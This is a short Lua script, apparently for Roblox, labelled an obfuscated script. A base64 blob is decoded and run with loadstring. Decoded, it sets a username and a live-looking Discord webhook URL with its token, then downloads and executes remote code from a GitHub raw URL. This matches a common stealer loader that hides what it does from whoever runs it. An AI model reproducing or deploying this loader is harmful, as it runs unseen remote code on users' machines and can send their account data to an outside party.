
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIkZFREVPTkJMT1hTVVMzIgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMjc5ODI3NzA2MTc1ODU3NDgvT0R4amxUbTJHMzJmNWYzWV9iX2hya2x3SXlEeGVWVm93bEdfaUtaNmNtRFRyMVpieU1sZGVrMjVNU2dBbzV5VTh6cVMiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS9wbHMtZG9uYXRlL3JlZnMvaGVhZHMvbWFpbi9wbHMlMjBkb2FudGUiLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()